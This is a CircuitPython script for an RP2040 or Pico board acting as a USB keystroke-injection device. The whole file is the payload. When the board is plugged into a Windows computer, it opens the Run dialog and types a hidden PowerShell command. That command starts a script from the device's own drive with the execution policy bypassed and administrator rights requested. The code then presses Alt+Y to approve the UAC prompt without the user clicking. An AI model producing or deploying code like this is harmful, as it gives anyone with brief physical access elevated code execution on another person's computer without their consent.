import time
import board
import digitalio
import usb_hid

# --- SAFETY DELAY ---
# 3 Seconds to unplug if something goes wrong
time.sleep(3.0)

try:
    from adafruit_hid.keyboard import Keyboard
    from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
    from adafruit_hid.keycode import Keycode
except ImportError:
    # Blink LED fast if libraries are missing
    led = digitalio.DigitalInOut(board.GP25)
    led.direction = digitalio.Direction.OUTPUT
    while True:
        led.value = not led.value
        time.sleep(0.1)

# --- SETUP ---
try:
    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
except:
    time.sleep(1)

# Detect LED (GP23 for YD-RP2040, GP25 for Pico)
led_pin = board.GP23 if hasattr(board, "GP23") else board.GP25
led = digitalio.DigitalInOut(led_pin)
led.direction = digitalio.Direction.OUTPUT

# --- CONFIGURATION ---
TARGET_DRIVE = "CIRCUITPY"
TARGET_FILE  = "ROOT\\Launch.ps1"

# --- PAYLOAD ---
led.value = True

# 1. Open Run Dialog
kbd.press(Keycode.GUI, Keycode.R)
time.sleep(0.1)
kbd.release_all()

# 2. Wait for Run Box (Critical Delay)
# If this is too short, the first letters will go missing.
time.sleep(1.5)

# 3. Type Command
# We rely on standard typing speed. It cannot be "pasted".
# -Exec Bypass: Allows script to run.
# -Verb RunAs: Triggers the UAC Prompt.
cmd = f"powershell -W Hidden -C \"$d=(Get-Volume -FileSystemLabel '{TARGET_DRIVE}').DriveLetter; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File',($d+':\\{TARGET_FILE}') -Verb RunAs\""

layout.write(cmd)

# 4. Press Enter to Execute
time.sleep(0.5)
kbd.press(Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

# --- UAC BYPASS (ALT + Y) ---
# 5. Wait for Screen to Dim (UAC Prompt)
# Windows takes a few seconds to switch to the Secure Desktop.
time.sleep(5.0)

# 6. Trigger "Yes"
# ALT+Y is the standard Windows shortcut to click "Yes" in UAC.
kbd.press(Keycode.ALT, Keycode.Y)
time.sleep(0.1)
kbd.release_all()
# ----------------------------

led.value = False